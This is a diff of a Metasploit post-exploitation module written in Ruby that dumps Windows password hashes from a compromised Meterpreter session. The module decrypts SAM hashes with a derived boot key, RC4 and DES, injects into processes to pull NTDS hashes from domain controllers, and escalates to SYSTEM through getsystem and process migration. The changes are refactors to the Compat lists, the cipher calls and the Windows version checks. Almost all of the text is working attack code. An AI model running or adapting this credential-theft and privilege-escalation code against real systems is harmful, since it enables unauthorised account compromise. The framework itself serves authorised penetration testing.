@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Priv
@@ -24,7 +23,19 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_migrate
+              priv_elevate_getsystem
+              priv_passwd_get_sam_hashes
+              stdapi_registry_open_key
+              stdapi_sys_config_sysinfo
+              stdapi_sys_process_getpid
+            ]
+          }
+        }
       )
     )
     register_options(
@@ -41,7 +52,6 @@ class MetasploitModule < Msf::Post
     @sam_numeric = "0123456789012345678901234567890123456789\x00"
     @sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')
     @sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')
-
   end
 
   # Run Method for when run command is issued
@@ -71,6 +81,7 @@ class MetasploitModule < Msf::Post
     hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
     rc4 = OpenSSL::Cipher.new('rc4')
+    rc4.decrypt
     rc4.key = hash.digest
     hbootkey = rc4.update(vf[0x80, 32])
     hbootkey << rc4.final
@@ -163,7 +174,6 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def rid_to_key(rid)
-
     s1 = [rid].pack('V')
     s1 << s1[0, 3]
 
@@ -176,7 +186,6 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def decrypt_user_hash(rid, hbootkey, enchash, pass)
-
     if enchash.empty?
       case pass
       when @sam_lmpass
@@ -190,10 +199,12 @@ class MetasploitModule < Msf::Post
     des_k1, des_k2 = rid_to_key(rid)
 
     d1 = OpenSSL::Cipher.new('des-ecb')
+    d1.decrypt
     d1.padding = 0
     d1.key = des_k1
 
     d2 = OpenSSL::Cipher.new('des-ecb')
+    d2.decrypt
     d2.padding = 0
     d2.key = des_k2
 
@@ -201,13 +212,14 @@ class MetasploitModule < Msf::Post
     md5.update(hbootkey[0, 16] + [rid].pack('V') + pass)
 
     rc4 = OpenSSL::Cipher.new('rc4')
+    rc4.decrypt
     rc4.key = md5.digest
     okey = rc4.update(enchash)
 
-    d1o = d1.decrypt.update(okey[0, 8])
+    d1o = d1.update(okey[0, 8])
     d1o << d1.final
 
-    d2o = d2.decrypt.update(okey[8, 8])
+    d2o = d2.update(okey[8, 8])
     d1o << d2.final
     d1o + d2o
   end
@@ -372,20 +384,6 @@ class MetasploitModule < Msf::Post
   end
   #-------------------------------------------------------------------------------
 
-  # Function for checking if target is a DC
-  def is_dc?
-    is_dc_srv = false
-    serviceskey = 'HKLM\\SYSTEM\\CurrentControlSet\\Services'
-    if registry_enumkeys(serviceskey).include?('NTDS')
-      if registry_enumkeys(serviceskey + '\\NTDS').include?('Parameters')
-        print_good("\tThis host is a Domain Controller!")
-        is_dc_srv = true
-      end
-    end
-    return is_dc_srv
-  end
-  #-------------------------------------------------------------------------------
-
   # Function to migrate to a process running as SYSTEM
   def move_to_sys
     # Make sure you got the correct SYSTEM Account Name no matter the OS Language
@@ -414,19 +412,22 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def smart_hash_dump(migrate_system, pwdfile)
-    domain_controller = is_dc?
+    domain_controller = domain_controller?
+    print_good('Host is a Domain Controller') if domain_controller
+
     if !is_uac_enabled? || is_admin?
       print_status('Dumping password hashes...')
+      version = get_version_info
       # Check if Running as SYSTEM
       if is_system?
         # For DC's the registry read method does not work.
         if domain_controller
           begin
             file_local_write(pwdfile, inject_hashdump)
-          rescue ::Exception => e
+          rescue ::Exception
             print_error('Failed to dump hashes as SYSTEM, trying to migrate to another process')
 
-            if sysinfo['OS'] =~ /Windows (2008|2012)/i
+            if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?
               move_to_sys
               file_local_write(pwdfile, inject_hashdump)
             else
@@ -441,62 +442,57 @@ class MetasploitModule < Msf::Post
         end
 
         # Check if not running as SYSTEM
-      else
+      elsif domain_controller
 
         # Check if Domain Controller
-        if domain_controller
-          begin
-            file_local_write(pwdfile, inject_hashdump)
-          rescue StandardError
-            if migrate_system
-              print_status('Trying to get SYSTEM privilege')
-              results = session.priv.getsystem
-              if results[0]
-                print_good('Got SYSTEM privilege')
-                if session.sys.config.sysinfo['OS'] =~ /Windows (2008|2012)/i
-                  # Migrate process since on Windows 2008 R2 getsystem
-                  # does not set certain privilege tokens required to
-                  # inject and dump the hashes.
-                  move_to_sys
-                end
-                file_local_write(pwdfile, inject_hashdump)
-              else
-                print_error('Could not obtain SYSTEM privileges')
+        begin
+          file_local_write(pwdfile, inject_hashdump)
+        rescue StandardError
+          if migrate_system
+            print_status('Trying to get SYSTEM privilege')
+            results = session.priv.getsystem
+            if results[0]
+              print_good('Got SYSTEM privilege')
+              if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?
+                # Migrate process since on Windows 2008 R2 getsystem
+                # does not set certain privilege tokens required to
+                # inject and dump the hashes.
+                move_to_sys
               end
-            else
-              print_error('Could not get NTDS hashes!')
-            end
-          end
-        elsif sysinfo['OS'] =~ /Windows (7|8|2008|2012|Vista)/i
-          if migrate_system
-            print_status('Trying to get SYSTEM privilege')
-            results = session.priv.getsystem
-            if results[0]
-              print_good('Got SYSTEM privilege')
-              file_local_write(pwdfile, read_hashdump)
-            else
-              print_error('Could not obtain SYSTEM privilege')
-            end
-          else
-            print_error('On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes')
-            print_error('Try setting GETSYSTEM to true.')
-          end
-
-        else
-          if migrate_system
-            print_status('Trying to get SYSTEM privilege')
-            results = session.priv.getsystem
-            if results[0]
-              print_good('Got SYSTEM privilege')
-              file_local_write(pwdfile, read_hashdump)
+              file_local_write(pwdfile, inject_hashdump)
             else
               print_error('Could not obtain SYSTEM privileges')
             end
           else
-            file_local_write(pwdfile, inject_hashdump)
+            print_error('Could not get NTDS hashes!')
           end
-
         end
+      elsif version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win81)
+        if migrate_system
+          print_status('Trying to get SYSTEM privilege')
+          results = session.priv.getsystem
+          if results[0]
+            print_good('Got SYSTEM privilege')
+            file_local_write(pwdfile, read_hashdump)
+          else
+            print_error('Could not obtain SYSTEM privilege')
+          end
+        else
+          print_error('On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes')
+          print_error('Try setting GETSYSTEM to true.')
+        end
+
+      elsif migrate_system
+        print_status('Trying to get SYSTEM privilege')
+        results = session.priv.getsystem
+        if results[0]
+          print_good('Got SYSTEM privilege')
+          file_local_write(pwdfile, read_hashdump)
+        else
+          print_error('Could not obtain SYSTEM privileges')
+        end
+      else
+        file_local_write(pwdfile, inject_hashdump)
 
       end
     else
